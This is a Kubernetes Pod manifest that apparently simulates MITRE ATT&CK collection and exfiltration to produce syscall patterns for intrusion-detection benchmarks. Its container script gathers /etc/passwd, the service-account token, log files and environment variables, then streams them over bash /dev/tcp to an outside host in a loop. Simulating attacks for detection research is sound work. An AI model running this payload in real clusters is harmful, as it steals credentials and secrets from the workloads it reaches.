# MITRE ATT&CK TA0009/TA0010 — Collection + Exfiltration
# Core benchmark scenario in: ADFA-LD (webshell c100), DeepLog, SyscallAD,
# every network-aware IDS paper; also Stratus Red Team "exfiltrate-secrets"
#
# Distinctive syscall pattern (two-phase):
#   Phase 1 (Collection): openat × N → read × N → write (staging file)
#   Phase 2 (Exfil):      read(staging) → socket → connect → sendto/write(socket)
#   High read byte-count on diverse paths followed by large outbound write
apiVersion: v1
kind: Pod
metadata:
  name: attack-exfiltration
  namespace: demo
  labels:
    role: attack
    scenario: exfiltration
    mitre: TA0009-TA0010
spec:
  restartPolicy: Always
  containers:
  - name: attacker
    image: ubuntu:22.04
    command:
    - bash
    - -c
    - |
      while true; do
        # Phase 1: collect/stage sensitive data
        STAGE=/tmp/.stage_$$
        {
          cat /etc/passwd
          cat /etc/hosts
          cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
          find /etc /var/log -maxdepth 2 -readable -type f 2>/dev/null \
            | head -10 | xargs cat 2>/dev/null
          env
        } > "$STAGE" 2>/dev/null

        # Phase 2: exfiltrate — attempt to send staged data outbound
        # Uses /dev/tcp (pure bash) to avoid requiring curl/nc
        (
          exec 3>/dev/tcp/8.8.8.8/443 2>/dev/null
          cat "$STAGE" >&3
          exec 3>&-
        ) 2>/dev/null || true

        rm -f "$STAGE"
        sleep 30
      done
    resources:
      requests: { cpu: 10m, memory: 32Mi }
      limits:   { cpu: 100m, memory: 64Mi }
